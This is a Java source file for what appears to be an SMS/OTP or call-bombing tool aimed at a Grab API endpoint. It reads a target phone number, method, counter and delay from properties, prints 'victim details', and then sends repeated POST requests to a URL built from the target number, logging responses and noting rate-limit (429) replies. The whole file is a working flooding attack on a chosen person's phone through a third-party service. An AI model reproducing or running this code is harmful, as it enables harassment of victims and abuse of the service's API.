package xyz.un4.grab.brokenapi;

import java.io.IOException;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import xyz.un4.grab.brokenapi.model.GrabRequest;
import xyz.un4.grab.brokenapi.resouces.Resource;
import xyz.un4.grab.brokenapi.util.PropertiesLoader;

public class App {
	
	private static final Gson gson = new GsonBuilder().disableHtmlEscaping().create();
	
	
    public static void main( String[] args ) {
    	
    	GrabRequest grabRequest = PropertiesLoader.loader();    	

    	// System.exit(-1);
    	
    	RequestBody reqbody = RequestBody.create(null, new byte[0]);  
    	
    	if(null!=grabRequest) {
    		
    		Resource.printBanner();
    		Resource.printVictimDetails(grabRequest);
    		
    		OkHttpClient client = new OkHttpClient();
        	Request request = new Request.Builder()
        	  .url(Resource.BASE_URL.replace("${METHOD}", grabRequest.getMethod()).replace("${TARGET_NUMBER}", grabRequest.getTargetNumber()))
        	  .post(reqbody)
        	  .addHeader("Content-Type", "application/x-www-form-urlencoded")
        	  .build();
        	System.out.println(Resource.stars);
        	for(int i=1;i<=grabRequest.getCounter();i++) {
        	
            	try {
            		
        			Response response = client.newCall(request).execute();
        			System.out.println("[+] Couter>> "+(i)+"");
        			if(response.toString().contains("429")) {
        				System.out.println("[-] Response>> "+ gson.toJson(response.toString()));
        			}else {
        				System.out.println("[+] Response>> "+ gson.toJson(response.toString()));
        			}
        			
        		} catch (IOException e) {
        			System.out.println("[-] Something wrong");
        			break;
        		}
            	
            	try {
					Thread.sleep(grabRequest.getDelay());
				} catch (InterruptedException e) {
					System.out.println("[-] Something wrong");
					break;
				}
            	
        	}
        	System.out.println(Resource.stars);
    	}else {
    		Resource.printBanner();
    		
    	}
    	
    	
        
    }
}
